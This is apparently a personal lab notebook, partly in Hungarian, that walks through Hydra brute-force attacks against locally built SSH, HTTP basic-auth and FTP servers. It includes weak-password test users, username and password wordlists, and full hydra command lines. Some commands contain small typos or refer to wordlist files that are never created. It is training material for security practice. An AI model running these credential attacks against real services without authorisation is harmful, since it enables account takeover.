Hydra

Brute force forgotten user password:
hydra -l <username> -P <password_file> -o <output_file> <service>://<target>
Kompletten:
hydra -l testuser -p passswords.txt -o results.txt ssh://127.0.0.1
Ez végigfuttatja a bruteforce requestet.


Attack http server with hydra:
create http folder:
mkdir http_server
cd http_server
echo “<h1>Welcome this is the home page</h1>” > index.html
#Itt a & jel azt jelenti hogy a háttérben fog futni a szerver
python3 -m http.server 8000 &
Ellenőrzés hogy fut -e a webszerver:
netstat -tulnp | grep 8000
Curl-el ellenőrizhető hogy mit ad vissza:
curl http:127.0.0.1:8000
cd http_server
Létrehoz egy htpassword fájlt az adminhoz
htpasswd -c htpasswd admin
Amikor kéri a jelszót: password123
Itt szándékosan használunk gyenge jelszót hogy szemléltessük a hydra működését.
Létrehozzuk az auth szervert:
nano auth_server.py

Python kód megtalálható: ./http_server.py:

Kilépés: Ctrl + O, Enter Ctrl + X
Állítsd le az előző szervert:
pkill -f "python3 -m http.server"
Indítsd el az újat amiben van már authentikáció:
python3 auth_server.py &

Teszteld le, most authentikációt fog kérni:
curl -v http://localhost:8000
Add hozzá az authentikációs paramétereket:
curl -v -u admin:password123 http://localhost:8000

Ezúttal most lefut az auth.

Jöhet a hydra tesztelése, brute force attack
cd ~/project
mkdir wordlists
nano usernames.txt

Tölsd fel a fájlt a következőkkel:
admin
root
user
test
guest
administrator

Csinálj egy passwords.txt fájlt is:
password123
password
123456
admin
letmein
qwerty

Ellenőrizd:
cat usernames.txt
cat passwords.txt

cd ~/project/wordlists
Run hydra:
Ez lefuttatja sok http get requestet:
hydra -L usernames.txt -P combined_passwords.txt localhost -s 8000 http-get /

Futtatás úgy, hogy elmentse későbbi ellenőrzésre:
hydra -L usernames.txt -P combined_passwords.txt localhost -s 8000 http-get / -o hydra_results.txt


## Attack FTP services

In this step, you will set up a local FTP server using vsftpd (Very Secure FTP Daemon) in the LabEx VM environment. FTP (File Transfer Protocol) is a standard network protocol used to transfer files between a client and server over a network. Think of it like a digital post office that handles file deliveries between computers.
1. Install vsftpd:
 sudo apt-get update && sudo apt-get install -y vsftpd
2. create backup:
 sudo cp /etc/vsftpd.conf /etc/vsftpd.conf.bak
3. edit config file with nano:
 sudo nano /etc/vsftpd.conf
In editing: disable anonymous access, allow local users to log in, permit file uploads, restrict users to their home directories
anonymous_enable=NO
local_enable=YES
write_enable=YES
chroot_local_user=YES
allow_writeable_chroot=YES
4. Verify changes:
grep -E "^(anonymous_enable|local_enable|write_enable|chroot_local_user|allow_writeable_chroot)=" /etc/vsftpd.conf | cat
5. restart vsftpd:
 sudo service vsftpd restart
6. 
Create new ftp user:
sudo useradd -m ftpuser -s /bin/bash
sudo passwd ftpuser
7. Create new directory for testing:
sudo mkdir -p /home/ftpuser/ftp_test
sudo chown ftpuser:ftpuser /home/ftpuser/ftp_test
8. Check if ftp service is running:
sudo service vsftpd status

## Configure FTP server with test users and weak password (for demonstration purpopses only):
sudo useradd -m ftpuser1 -s /bin/bash
echo "ftpuser1:password1" | sudo chpasswd

sudo useradd -m ftpuser2 -s /bin/bash
echo "ftpuser2:password2" | sudo chpasswd

sudo useradd -m ftpuser3 -s /bin/bash
echo "ftpuser3:password3" | sudo chpasswd

2. Create dedicated FTP directories for users:
sudo mkdir -p /home/ftpuser1/ftp_files
sudo mkdir -p /home/ftpuser2/ftp_files
sudo mkdir -p /home/ftpuser3/ftp_files

sudo chown ftpuser1:ftpuser1 /home/ftpuser1/ftp_files
sudo chown ftpuser2:ftpuser2 /home/ftpuser2/ftp_files
sudo chown ftpuser3:ftpuser3 /home/ftpuser3/ftp_files

3. Create test files for each user:
echo "This is ftpuser1's test file" | sudo tee /home/ftpuser1/ftp_files/test1.txt
echo "This is ftpuser2's test file" | sudo tee /home/ftpuser2/ftp_files/test2.txt
echo "This is ftpuser3's test file" | sudo tee /home/ftpuser3/ftp_files/test3.txt

4. Check FTP acccess:
curl -u ftpuser1:password1 ftp://localhost/ftp_files/test1.txt

## Prepare attack lists

1. Create username and password list:
echo -e "ftpuser1\nftpuser2\nftpuser3\nadmin\nroot\nftp\ntest\nuser\nanonymous" > ~/project/ftp_users.txt
echo -e "password1\npassword2\npassword3\npassword123\n123456\npassword\nadmin\nroot\nftp\ntest\nqwerty\nletmein" > ~/project/ftp_passwords.txt

## Execute Attack:

1. Run attack with generated username and password list:
hydra -L ~/project/ftp_users.txt -P ~/project/test_passwords.txt ftp://localhost
Run with verbose to see the progress, add the -vV flag
Run with -t N flag to limit to N parallel connection to avoid overloading the server:
hydra -L ~/project/ftp_users.txt -P ~/project/combined_passwords.txt ftp://localhost -t 4
Write to file with -o flag:
hydra -L ~/project/ftp_users.txt -P ~/project/test_passwords.txt ftp://localhost -o ~/project/hydra_results.txt

